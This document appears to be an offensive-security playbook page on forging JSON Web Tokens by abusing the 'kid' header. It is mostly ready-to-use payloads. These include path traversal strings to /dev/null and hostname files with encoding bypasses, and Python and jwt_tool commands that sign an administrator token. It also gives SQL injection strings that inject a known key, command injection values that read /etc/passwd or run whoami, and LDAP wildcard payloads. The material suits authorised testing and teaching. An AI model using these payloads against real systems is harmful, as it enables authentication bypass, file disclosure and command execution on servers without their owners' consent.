# JWT — `kid` Header Path Traversal

## When this applies

- The `kid` (Key ID) header parameter is used to look up a verification key from the filesystem (e.g. `cat /keys/<kid>.pem`) without sanitization.
- You can supply an arbitrary path that points to a file with predictable content.

## Technique

Set `kid` to a path traversal that resolves to a file whose content you control or can predict. Sign the token with the predicted file's content as the HMAC secret. The vulnerable server reads the file, uses its content as the verification key, and accepts the signature.

## Steps

### 1. Confirm path traversal in `kid`

Set `kid` to `../../../../../../../etc/passwd` (or similar) and observe error messages. A 500 mentioning file-not-found, parse error, or key-format error confirms the file is being read.

### 2. Pick a target with predictable content

**`/dev/null` (empty / null bytes):**
```json
{"alg": "HS256", "kid": "../../../../../../../dev/null"}
```
Sign with: `AA==` (Base64-decoded null byte).

```python
import jwt, base64
header = {"alg":"HS256","kid":"../../../../../../../dev/null"}
payload = {"sub":"administrator"}
secret = base64.b64decode('AA==')   # \x00
token = jwt.encode(payload, secret, algorithm='HS256', headers=header)
```

**`/proc/sys/kernel/hostname` (predictable string):**
```json
{"kid": "../../../../../../../proc/sys/kernel/hostname"}
```
If hostname is `server1`, sign with: `c2VydmVyMQ==` (Base64 of `server1`).

**`/etc/hostname` (similar idea).**

**Custom config files when content is known:**
```json
{"kid": "../../../../../../../app/config/public.key"}
```

### 3. Path traversal variations

If basic traversal is normalized:

```
../../../../../../../dev/null
..././..././..././dev/null
....//....//....//dev/null
..;/..;/..;/..;/dev/null
%2e%2e%2f%2e%2e%2f%2e%2e%2fdev/null
%252e%252e%252fdev/null              (double encoding)
```

### 4. Sign with the file's actual content

The recovered "secret" is the literal byte content of the file. For `/dev/null`:

```python
secret = b''           # empty bytes
# OR
secret = b'\x00'       # one null byte (depending on how the reader reads)
```

Common files and their secret values:

| File | Content | Secret |
|---|---|---|
| `/dev/null` | empty / nothing | `b''` or `b'\x00'` |
| `/etc/hostname` | `<hostname>\n` | `b'<hostname>\n'` |
| `/proc/sys/kernel/hostname` | `<hostname>\n` | `b'<hostname>\n'` |
| `C:\Windows\win.ini` | known INI | exact file bytes |

### 5. Test multiple readers — they may strip newlines

Some libraries `strip()` the file content before using it as a key. Try:
- raw bytes (with newline)
- stripped (without newline)
- with/without trailing null

### 6. jwt_tool automation

```bash
python3 jwt_tool.py JWT -I -hc kid -hv "../../../../../../../dev/null" \
  -pc sub -pv admin -S
```

`-I` injects header value, `-hc kid -hv ...` sets the kid, `-S` signs with provided/null secret.

### 7. SQL injection via `kid` (when the lookup is `SELECT key FROM keys WHERE kid='X'`)

```json
{"kid": "' OR '1'='1"}
{"kid": "x' UNION SELECT 'known-secret' --"}
{"kid": "key1' AND 1=1 --"}
```

UNION-based: inject a known string as the "key", then sign the token with that string.
See `injection/scenarios/sql/auth-bypass.md` for full SQLi context.

### 8. Command injection via `kid` (when lookup uses shell)

```json
{"kid": "key; cat /etc/passwd #"}
{"kid": "key`whoami`"}
{"kid": "key$(cat /etc/passwd)"}
```

Triggered when the verifier does `subprocess.run(f"cat /keys/{kid}.pem", shell=True)`.

### 9. LDAP injection via `kid` (when lookup is LDAP query)

```json
{"kid": "*"}
{"kid": "*)(cn=*"}
```

Returns all keys; first one used → forge with that.

## Verifying success

- Forged token returns 200.
- Server logs (when accessible) show `kid` resolved to the traversed path.
- Token verifies at jwt.io when you supply the correct file content as the secret.

## Common pitfalls

- File-system path normalization (`os.path.realpath`) blocks traversal — modern libraries reject absolute paths or `..`.
- Some readers add `.pem` suffix — `kid="../../../etc/passwd"` becomes `../../../etc/passwd.pem` (which doesn't exist).
- Files like `/dev/null` are technically devices on Linux; some readers fail to open them as regular files.
- The "predictable content" must match EXACTLY — including trailing newlines. Test by reading the file directly first if you have any access.
- Charset issues: Windows paths use `\`, Linux paths use `/`. Test both `\\..\\..\\` and `/..//../`.

## Tools

- jwt_tool (`-I -hc kid -hv ...`).
- Custom Python with `jwt.encode(..., secret, headers={"kid":"..."})`.
- Burp Suite JWT Editor (manual kid manipulation).
